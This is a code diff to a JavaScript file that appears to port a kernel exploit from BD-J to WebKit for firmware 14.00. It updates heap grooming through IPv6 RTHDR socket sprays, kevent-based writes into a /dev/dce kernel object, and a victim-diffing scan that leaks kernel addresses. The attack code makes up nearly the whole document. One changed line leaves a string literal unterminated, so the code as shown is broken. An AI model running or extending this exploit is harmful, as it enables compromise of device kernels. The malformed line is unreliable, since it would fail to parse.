@@ -1,17 +1,14 @@
 import { int64 } from "./int64.js";
-// v10: + ?probe=fixed — answers the open MAP_FIXED question (bytecode pc 6923-7041
-//     requires mmap(page,...,0x1012) to RETURN page in BD-J; WebKit untested).
-//     P1: anon -> munmap -> MAP_FIXED at same addr (fixed honored at known-free addr?)
-//     P2: MAP_FIXED at 0x00fa8000 (shape of real fakeops page for dce~250)
+// v12: write-landing diagnostic — after every plant, diff ALL armed victims vs template.
+//     KV-DIFF shows victim/offset/got-values for ANY change; KV-SCANRES summarizes.
+//     ?full=1 widens candidates to every spray fd. Also keeps the ?probe=fixed MAP_FIXED probe.
 import { HX1400_TABLES } from "./hx_tables.js";
 
 // ============================================================================
 // hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
 // v9: A/B grooming — close candidate socket right before open("/dev/dce") so
 //     the dce kernel object lands in the freed victim slot (adjacent to an
-//     armed RTHDR). Needed because WebKit's 256B zone is churned vs BD-J's
-//     pristine app heap. Disable with URL &ab=0. (Bytecode itself does NOT
-//     close — this is an environmental adaptation, not a bytecode port.)
+//     armed RTHDR). Disable with URL &ab=0.
 // v8: full CANDS (30: multiples of 8..240) + phase R reclaim.
 // v7: fd ceiling adaptation + B1 census/plug. v5: x86 stub rescan.
 // ============================================================================
@@ -188,7 +185,7 @@ function phaseB1(dceDev) {
   const st = stBuf();
   const dceFd = scn("open", dceDev.addr, 2, 0, 0, 0, 0);
   if (dceFd < 0) fin("B1 dce open failed");
-  if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed");
+  if (!fstatOk(dceFd, st)) fin("B1 dce fstat failed);
   const ino = stIno(st);
   if (ino === 0) fin("our own /dev/dce has no usable st_ino - refusing to guess");
   log("B1", "dce_fd=" + dceFd + " ino=" + h16(BigInt(ino)));
@@ -296,31 +293,36 @@ function probeFixed() {
   fin("fixed probe done");
 }
 
-// ---------- scan loop (v9: A/B close-grooming) ----------
+// ---------- scan loop (v12: write-landing diagnostic) ----------
 function phase2Leak(rootKq, fds, dceDev, tpl) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
   const cl = allocBuf(64);
+  const tplU8 = new Uint8Array(tpl.ab);
 
   let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
   let kva = -1n, pageVal = 0n;
   let tries = 0;
+  let cands = CANDS;
+  if (ctx().params.get && ctx().params.get("full") === "1") {
+    cands = [];
+    for (let i = 0; i < fds.length; i++) cands.push(i);
+  }
 
   for (let attempt = 1; attempt <= 6; attempt++) {
     if (target >= 0 || tries >= MAX_TRIES) break;
-    log("KV-ATTEMPT", attempt + "/6 ab=" + (STATE.abClose ? "1" : "0"));
-    for (const fd of fds) disarm(fd);
-    for (const fd of fds) rearm(fd, tpl);
-    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
+    log("KV-ATTEMPT", attempt + "/6 ab=" + (STATE.abClose ? "1" : "0") + " cands=" + cands.length);
+    for (const fd of fds) if (fd !== -1) disarm(fd);
+    for (const fd of fds) if (fd !== -1) rearm(fd, tpl);
+    log("KV-REPACKED", "round=" + attempt);
 
-    for (let ci = 0; ci < CANDS.length && target < 0 && tries < MAX_TRIES; ci++) {
-      const vi = CANDS[ci];
+    for (let ci = 0; ci < cands.length && target < 0 && tries < MAX_TRIES; ci++) {
+      const vi = cands[ci];
       if (vi >= fds.length) continue;
       let fd = fds[vi];
       if (fd === -1) continue;
       if (!marked(fd, rdb, lenp)) continue;
       if (disarm(fd) !== 0) continue;
-      // v9 A/B: free the candidate's slot so dce's object lands in it
       if (STATE.abClose) {
         scn("close", fd);
         fds[vi] = -1;
@@ -341,7 +343,8 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
       log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
       if (rc !== 0) continue;
 
-      let joined = 0;
+      // v12: diff EVERY armed victim against the template - find where the write landed
+      let diffs = 0, joined = 0, logged = 0;
       for (let j = 0; j < fds.length; j++) {
         if (j === vi) continue;
         if (fds[j] === -1) continue;
@@ -349,18 +352,32 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
         lenp.dv.setUint32(0, RTH_LEN, true);
         lenp.dv.setUint32(4, 0, true);
         if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
-        const v8 = rdb.dv.getInt32(8, true);
-        const v12 = rdb.dv.getUint32(12, true) >>> 0;
-        if (v8 === pageInt && v12 === 0) {
+        const gotU8 = new Uint8Array(rdb.ab);
+        let dev = -1;
+        for (let k = 0; k < RTH_LEN; k++) {
+          if (gotU8[k] !== tplU8[k]) { dev = k; break; }
+        }
+        if (dev >= 0) {
+          diffs++;
+          if (logged < 6) {
+            logged++;
+            const v8 = rdb.dv.getInt32(8, true);
+            const v12 = rdb.dv.getUint32(12, true) >>> 0;
+            log("KV-DIFF", "victim=" + j + " off=" + dev + " got8=0x" + (v8 >>> 0).toString(16) +
+                " got12=0x" + v12.toString(16) + " want_page=0x" + (pageInt >>> 0).toString(16));
+          }
+        }
+        if ((rdb.dv.getInt32(8, true)) === pageInt && (rdb.dv.getUint32(12, true) >>> 0) === 0) {
           joined++;
           if (target < 0) { target = j; targetFd = fds[j]; }
           log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
-          // still armed
+        } else if (dev < 0) {
+          // pristine, nothing
         } else {
           rearm(fds[j], tpl);
         }
       }
+      log("KV-SCANRES", "dce=" + dce + " diffs=" + diffs + " joined=" + joined);
 
       if (target >= 0 && joined === 1) {
         zeroBuf(cl);
@@ -379,7 +396,7 @@ function phase2Leak(rootKq, fds, dceDev, tpl) {
   }
 
   if (kva === -1n)
-    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — blind writes missed; try ab=0/1");
+    fin("leak scan: no victim held (tries=" + tries + " target=" + target + ") — blind writes missed; see KV-DIFF lines");
   STATE.kva = kva;
   log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
   return { kva, page: pageVal, targetFd };
